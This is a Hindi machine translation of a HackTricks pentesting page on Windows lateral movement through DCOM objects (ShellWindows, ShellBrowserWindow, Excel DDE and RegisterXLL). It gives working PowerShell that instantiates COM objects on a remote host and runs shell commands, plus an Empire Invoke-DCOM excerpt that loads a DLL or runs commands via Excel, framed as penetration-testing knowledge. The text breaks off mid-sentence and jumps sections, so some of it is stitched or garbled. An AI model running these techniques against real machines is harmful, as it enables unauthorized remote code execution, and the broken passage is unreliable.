# DCOM Exec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड** करने की अनुमति चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का पालन करें।**
* **अपने हैकिंग ट्रिक्स साझा करें और** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके** अपना योगदान दें।.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

जल्दी से सबसे महत्वपूर्ण संकटों को खोजें ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी हमले की सतह का ट्रैक करता है, प्रोएक्टिव धमकी स्कैन चलाता है, आपकी पूरी टेक स्टैक, एपीआई से वेब ऐप्स और क्लाउड सिस्टम तक, मुद्दों को खोजता है। [**इसे नि: शुल्क परीक्षण के लिए प्रयास करें**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) आज।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## MMC20.Application

**DCOM** (वितरित संघटन ऑब्जेक्ट मॉडल) ऑब्जेक्ट नेटवर्क के माध्यम से ऑब्जेक्ट के साथ **बातचीत** करने की क्षमता के कारण **रोचक** होते हैं। माइक्रोसॉफ्ट के पास DCOM [यहां](https://msdn.microsoft.com/en-us/library/cc226801.aspx) और COM [यहां](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx) पर कुछ अच्छी दस्तावेज़ीकरण है। आप PowerShell का उपयोग करके DCOM अनुप्रयोगों की एक मजबूत सूची पा सकते हैं, द्वारा `Get-CimInstance Win32_DCOMApplication` चलाकर।

[MMC एप्लिकेशन कक्षा (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) COM ऑब्जेक्ट आपको एमएमसी स्नैप-इन ऑपरेशन के संघटनात्मक घटकों को स्क्रिप्ट करने की अनुमति देता है। इस COM ऑब्जेक्ट के भीतर विभिन्न विधियों और गुणों की जाँच करते समय, मैंने देखा है कि दस्तावेज़.ActiveView के तहत `ExecuteShellCommand` नामक एक विधि है।

![](<../../.gitbook/assets/image (4) (2) (1) (1).png>)

आप इस विधि पर और अधिक पढ़ सकते हैं [यहां](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx)। अब तक, हमारे पास एक DCOM अनुप्रयोग है जिसे हम नेटवर्क के माध्यम से एक्सेस कर सकते हैं और कमांड चला सकते हैं। अंतिम टुकड़ा यह है कि हम इस DCOM अनुप्रयोग और ExecuteShellCommand विधि का उपयोग करके एक दूरस्थ होस्ट पर कोड निष्पादन प्राप्त करने के लिए इसका उपयोग करें।

भाग्यशाली रूप से, एक व्यवस्थापक के रूप में, आप PowerShell का उपयोग करके DCOM के साथ दूरस्थ रूप से बातचीत कर सकते हैं, " `[activator]::CreateInstance([type]::GetTypeFromProgID` " का उपयोग करके। आपको बस इ
अब जब हमारे पास CLSID है, हम दूरस्थ लक्ष्य पर ऑब्जेक्ट को स्थापित कर सकते हैं:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>") #9BA05972-F6A8-11CF-A442-00A0C90A8F39
$obj = [System.Activator]::CreateInstance($com)
```
![](https://enigma0x3.files.wordpress.com/2017/01/remote\_instantiation\_shellwindows.png?w=690\&h=354)

दूरस्थ मेजबान पर ऑब्जेक्ट को निर्मित करने के साथ, हम इसके साथ संवाद कर सकते हैं और हमें चाहिए वाले किसी भी विधियों को आह्वानित कर सकते हैं। ऑब्जेक्ट को वापस मिलने वाला हैंडल हमें कई विधियों और गुणों का पता लगाता है, जिनमें से हम किसी से भी संवाद कर सकते हैं। दूरस्थ मेजबान के साथ वास्तविक संवाद प्राप्त करने के लिए, हमें [WindowsShell.Item](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773970\(v=vs.85\).aspx) विधि तक पहुंचने की आवश्यकता होती है, जो हमें वापस एक ऑब्जेक्ट देगा जो विंडोज शैल विंडो को प्रतिष्ठित करता है:
```
$item = $obj.Item()
```
![](https://enigma0x3.files.wordpress.com/2017/01/item\_instantiation.png?w=416\&h=465)

शैल विंडो पर पूर्ण नियंत्रण प्राप्त करने के बाद, हम अब सभी उम्मीदित विधियों / गुणों तक पहुंच सकते हैं जो उजागर किए गए हैं। इन विधियों को जानने के बाद, **`Document.Application.ShellExecute`** बाहर नजर आया। इस विधि के लिए पैरामीटर आवश्यकताओं का पालन करने के लिए सुनिश्चित करें, जो [यहां](https://msdn.microsoft.com/en-us/library/windows/desktop/gg537745\(v=vs.85\).aspx) दर्शाए गए हैं।
```powershell
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
![](https://enigma0x3.files.wordpress.com/2017/01/shellwindows\_command\_execution.png?w=690\&h=426)

जैसा कि आप ऊपर देख सकते हैं, हमारा कमांड एक रिमोट होस्ट पर सफलतापूर्वक निष्पादित हुआ।

### ShellBrowserWindow

यह विशेष ऑब्जेक्ट Windows 7 पर मौजूद नहीं है, जिसके कारण इसका उपयोग लैटरल मूवमेंट के लिए "ShellWindows" ऑब्जेक्ट की तुलना में थोड़ा अधिक सीमित हो जाता है, जिसे मैंने Win7-Win10 पर सफलतापूर्वक परीक्षण किया है।

इस ऑब्जेक्ट के अनुमानन के आधार पर, यह प्रभावी रूप से पिछले ऑब्जेक्ट की तरह एक Explorer विंडो में इंटरफेस प्रदान करता है। इस ऑब्जेक्ट को शुरू करने के लिए, हमें इसका CLSID प्राप्त करना होगा। उपरोक्त, हम OleView .NET का उपयोग कर सकते हैं:

![shellbrowser\_classid](https://enigma0x3.files.wordpress.com/2017/01/shellbrowser\_classid.png?w=428\&h=414)

फिर से, खाली लॉन्च परमिशन फ़ील्ड का ध्यान दें:

![screen-shot-2017-01-23-at-4-13-52-pm](https://enigma0x3.files.wordpress.com/2017/01/screen-shot-2017-01-23-at-4-13-52-pm.png?w=399\&h=340)

CLSID के साथ, हम पिछले ऑब्जेक्ट पर लिए गए कदमों को दोहरा सकते हैं ताकि ऑब्जेक्ट को शुरू किया जा सके और एक ही मेथड को कॉल किया जा सके:
```powershell
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "<IP>")
$obj = [System.Activator]::CreateInstance($com)

$obj.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\system32", $null, 0)
```
![](https://enigma0x3.files.wordpress.com/2017/01/shellbrowserwindow\_command\_execution.png?w=690\&h=441)

जैसा कि आप देख सकते हैं, यह आदेश सफलतापूर्वक दूरस्थ लक्ष्य पर कार्यान्वित हुआ।

यह वस्तु सीधे Windows शैल से संबद्ध होती है, इसलिए हमें पिछली वस्तु पर "ShellWindows.Item" विधि को आह्वान नहीं करने की आवश्यकता नहीं है।

यद्यपि इन दो DCOM वस्तुओं का उपयोग दूरस्थ होस्ट पर शैल आदेश चलाने के लिए किया जा सकता है, लेकिन इसके अलावा भी कई और दिलचस्प विधियां हैं जिनका उपयोग दूरस्थ लक्ष्य की जांच या दंग करने के लिए किया जा सकता है। इनमें से कुछ विधियां शामिल हैं:

* `Document.Application.ServiceStart()`
* `Document.Application.ServiceStop()`
* `Document.Application.IsServiceRunning()`
* `Document.Application.ShutDownWindows()`
* `Document.Application.GetSystemInformation()`

## ExcelDDE और RegisterXLL

एक समान तरीके से DCOM Excel वस्तुओं का उपयोग लैटरली करना संभव है, अधिक जानकारी के लिए [https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) पढ़ें।
```powershell
# Chunk of code from https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1
## You can see here how to abuse excel for RCE
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
## उपकरण

पावरशेल स्क्रिप्ट [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) दूसरे मशीनों में कोड निष्पादित करने के लिए सभी टिप्पणी की गई तरीकों को आसानी से आमंत्रित करने की अनुमति देता है।

## संदर्भ

* पहली विधि [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) से कॉपी की गई थी, अधिक जानकारी के लिए लिंक पर जाएं।
* दूसरा खंड [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/) से कॉपी किया गया था, अधिक जानकारी के लिए लिंक पर जाएं।

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

विशेषताएं खोजें जो सबसे महत्वपूर्ण हैं ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी हमला सतह का ट्रैक करता है, प्रोएक्टिव ध्रुवीकरण स्कैन चलाता है, आपकी पूरी टेक स्टैक, एपीआई से वेब ऐप्स और क्लाउड सिस्टम तक, में समस्याएं खोजता है। [**इसे मुफ्त में प्रयास करें**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) आज।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने की अनुमति** चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**

</details>
